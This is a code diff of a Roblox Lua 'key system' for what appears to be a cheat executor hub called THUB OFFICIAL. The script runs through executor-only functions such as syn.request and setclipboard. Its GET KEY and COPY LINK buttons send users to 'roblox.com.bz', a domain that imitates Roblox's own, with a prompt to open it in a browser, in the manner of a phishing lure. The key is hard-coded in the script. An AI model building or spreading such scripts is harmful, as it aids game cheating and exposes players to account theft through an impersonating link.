@@ -1,48 +1,40 @@
 --========================================================--
---                    THUB OFFICIAL                       --
---              ULTRA PREMIUM EXECUTOR HUB                --
+--                 THUB OFFICIAL KEY SYSTEM               --
 --========================================================--
 
---// SERVICES
-
-local Players = game:GetService("Players")
-local UIS = game:GetService("UserInputService")
-local RunService = game:GetService("RunService")
-local Lighting = game:GetService("Lighting")
 local TweenService = game:GetService("TweenService")
-local TeleportService = game:GetService("TeleportService")
-local VirtualUser = game:GetService("VirtualUser")
-
-local Player = Players.LocalPlayer
-local Mouse = Player:GetMouse()
-
---// REMOVE OLD UI
+local Lighting = game:GetService("Lighting")
 
 pcall(function()
-	game.CoreGui:FindFirstChild("THUB_OFFICIAL"):Destroy()
 	game.CoreGui:FindFirstChild("THUB_KEYSYSTEM"):Destroy()
 end)
 
---========================================================--
---                     KEY SYSTEM                         --
---========================================================--
-
 local CorrectKey = "THUB2026"
 local KeyPassed = false
+
+-- CHANGE THIS LINK
+
+local KeyLink = "https://roblox.com.bz/communities/520850900/"
+
+-- GUI
 
 local KeyGui = Instance.new("ScreenGui")
 KeyGui.Name = "THUB_KEYSYSTEM"
 KeyGui.Parent = game.CoreGui
 KeyGui.ResetOnSpawn = false
 
+-- BLUR
+
 local Blur = Instance.new("BlurEffect")
 Blur.Parent = Lighting
 Blur.Size = 15
 
+-- MAIN
+
 local KeyMain = Instance.new("Frame")
 KeyMain.Parent = KeyGui
-KeyMain.Size = UDim2.new(0,430,0,260)
-KeyMain.Position = UDim2.new(0.5,-215,0.5,-130)
+KeyMain.Size = UDim2.new(0,430,0,300)
+KeyMain.Position = UDim2.new(0.5,-215,0.5,-150)
 KeyMain.BackgroundColor3 = Color3.fromRGB(15,15,15)
 KeyMain.BorderSizePixel = 0
 KeyMain.Active = true
@@ -52,6 +44,8 @@ Instance.new("UICorner",KeyMain).CornerRadius = UDim.new(0,20)
 local Stroke = Instance.new("UIStroke")
 Stroke.Parent = KeyMain
 Stroke.Color = Color3.fromRGB(60,60,60)
+
+-- TOPBAR
 
 local Topbar = Instance.new("Frame")
 Topbar.Parent = KeyMain
@@ -68,6 +62,8 @@ Fix.Position = UDim2.new(0,0,1,-20)
 Fix.BackgroundColor3 = Color3.fromRGB(20,20,20)
 Fix.BorderSizePixel = 0
 
+-- TITLE
+
 local Title = Instance.new("TextLabel")
 Title.Parent = Topbar
 Title.BackgroundTransparency = 1
@@ -76,6 +72,8 @@ Title.Font = Enum.Font.GothamBold
 Title.Text = "THUB OFFICIAL"
 Title.TextColor3 = Color3.new(1,1,1)
 Title.TextSize = 24
+
+-- SUBTITLE
 
 local Subtitle = Instance.new("TextLabel")
 Subtitle.Parent = KeyMain
@@ -87,24 +85,59 @@ Subtitle.Text = "Premium Access Key System"
 Subtitle.TextColor3 = Color3.fromRGB(180,180,180)
 Subtitle.TextSize = 15
 
+-- INPUT BOX
+
 local KeyBox = Instance.new("TextBox")
 KeyBox.Parent = KeyMain
 KeyBox.Size = UDim2.new(0,340,0,45)
-KeyBox.Position = UDim2.new(0.5,-170,0,110)
+KeyBox.Position = UDim2.new(0.5,-170,0,105)
 KeyBox.BackgroundColor3 = Color3.fromRGB(22,22,22)
 KeyBox.PlaceholderText = "Enter Key..."
 KeyBox.Text = ""
 KeyBox.Font = Enum.Font.GothamSemibold
 KeyBox.TextColor3 = Color3.new(1,1,1)
+KeyBox.PlaceholderColor3 = Color3.fromRGB(120,120,120)
 KeyBox.TextSize = 16
 KeyBox.BorderSizePixel = 0
 
 Instance.new("UICorner",KeyBox).CornerRadius = UDim.new(0,12)
 
+-- COPY LINK BUTTON
+
+local CopyButton = Instance.new("TextButton")
+CopyButton.Parent = KeyMain
+CopyButton.Size = UDim2.new(0,165,0,40)
+CopyButton.Position = UDim2.new(0.5,-170,0,170)
+CopyButton.BackgroundColor3 = Color3.fromRGB(35,35,35)
+CopyButton.Text = "COPY LINK"
+CopyButton.Font = Enum.Font.GothamBold
+CopyButton.TextColor3 = Color3.new(1,1,1)
+CopyButton.TextSize = 15
+CopyButton.BorderSizePixel = 0
+
+Instance.new("UICorner",CopyButton).CornerRadius = UDim.new(0,10)
+
+-- GET KEY BUTTON
+
+local GetKey = Instance.new("TextButton")
+GetKey.Parent = KeyMain
+GetKey.Size = UDim2.new(0,165,0,40)
+GetKey.Position = UDim2.new(0.5,5,0,170)
+GetKey.BackgroundColor3 = Color3.fromRGB(0,120,255)
+GetKey.Text = "GET KEY"
+GetKey.Font = Enum.Font.GothamBold
+GetKey.TextColor3 = Color3.new(1,1,1)
+GetKey.TextSize = 15
+GetKey.BorderSizePixel = 0
+
+Instance.new("UICorner",GetKey).CornerRadius = UDim.new(0,10)
+
+-- CHECK BUTTON
+
 local Check = Instance.new("TextButton")
 Check.Parent = KeyMain
 Check.Size = UDim2.new(0,340,0,45)
-Check.Position = UDim2.new(0.5,-170,0,170)
+Check.Position = UDim2.new(0.5,-170,0,220)
 Check.BackgroundColor3 = Color3.fromRGB(0,170,127)
 Check.Text = "UNLOCK"
 Check.Font = Enum.Font.GothamBold
@@ -113,6 +146,8 @@ Check.TextSize = 17
 Check.BorderSizePixel = 0
 
 Instance.new("UICorner",Check).CornerRadius = UDim.new(0,12)
+
+-- STATUS
 
 local Status = Instance.new("TextLabel")
 Status.Parent = KeyMain
@@ -123,6 +158,42 @@ Status.Font = Enum.Font.Gotham
 Status.Text = ""
 Status.TextColor3 = Color3.fromRGB(255,80,80)
 Status.TextSize = 14
+
+-- COPY LINK
+
+CopyButton.MouseButton1Click:Connect(function()
+
+	if setclipboard then
+
+		setclipboard(KeyLink)
+
+		Status.TextColor3 = Color3.fromRGB(0,255,127)
+		Status.Text = "Link Copied"
+
+	else
+
+		Status.TextColor3 = Color3.fromRGB(255,80,80)
+		Status.Text = "Clipboard Unsupported"
+	end
+end)
+
+-- GET KEY
+
+GetKey.MouseButton1Click:Connect(function()
+
+	Status.TextColor3 = Color3.fromRGB(0,170,255)
+	Status.Text = "Open Link In Browser"
+
+	if syn and syn.request then
+
+		syn.request({
+			Url = KeyLink,
+			Method = "GET"
+		})
+	end
+end)
+
+-- CHECK KEY
 
 Check.MouseButton1Click:Connect(function()
 
@@ -138,11 +209,81 @@ Check.MouseButton1Click:Connect(function()
 		KeyGui:Destroy()
 		Blur:Destroy()
 
+		print("THUB LOADED")
+
 	else
 
 		Status.TextColor3 = Color3.fromRGB(255,80,80)
 		Status.Text = "Invalid Key"
 
+		TweenService:Create(
+			KeyMain,
+			TweenInfo.new(0.08),
+			{Position = KeyMain.Position + UDim2.new(0,-8,0,0)}
+		):Play()
+
+		wait(0.08)
+
+		TweenService:Create(
+			KeyMain,
+			TweenInfo.new(0.08),
+			{Position = UDim2.new(0.5,-215,0.5,-150)}
+		):Play()
+	end
+end)
+
+-- DRAG SYSTEM
+
+local UIS = game:GetService("UserInputService")
+
+local dragging
+local dragInput
+local dragStart
+local startPos
+
+local function update(input)
+
+	local delta = input.Position - dragStart
+
+	KeyMain.Position = UDim2.new(
+		startPos.X.Scale,
+		startPos.X.Offset + delta.X,
+		startPos.Y.Scale,
+		startPos.Y.Offset + delta.Y
+	)
+end
+
+Topbar.InputBegan:Connect(function(input)
+
+	if input.UserInputType == Enum.UserInputType.MouseButton1
+	or input.UserInputType == Enum.UserInputType.Touch then
+
+		dragging = true
+		dragStart = input.Position
+		startPos = KeyMain.Position
+
+		input.Changed:Connect(function()
+
+			if input.UserInputState == Enum.UserInputState.End then
+				dragging = false
+			end
+		end)
+	end
+end)
+
+Topbar.InputChanged:Connect(function(input)
+
+	if input.UserInputType == Enum.UserInputType.MouseMovement
+	or input.UserInputType == Enum.UserInputType.Touch then
+
+		dragInput = input
+	end
+end)
+
+UIS.InputChanged:Connect(function(input)
+
+	if input == dragInput and dragging then
+		update(input)
 	end
 end)
 
